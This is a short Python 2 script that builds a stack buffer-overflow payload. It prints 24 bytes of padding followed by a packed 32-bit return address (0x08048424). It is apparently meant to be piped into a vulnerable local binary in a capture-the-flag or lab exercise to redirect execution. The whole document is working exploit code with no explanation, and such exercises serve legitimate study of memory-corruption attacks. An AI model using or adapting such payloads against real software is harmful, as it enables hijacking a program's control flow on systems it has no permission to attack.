import struct

padding = "aaaabbbbccccddddeeeeffff"
ret = struct.pack("I", 0x08048424)

print padding + ret
